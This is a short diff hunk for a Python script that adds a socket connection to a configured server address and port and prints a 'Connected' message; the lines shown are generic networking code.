@@ -36,4 +36,6 @@ while True:
 
     
 
+s.connect((server_ip, int(server_port)))
+print("[+] Connected.")
 
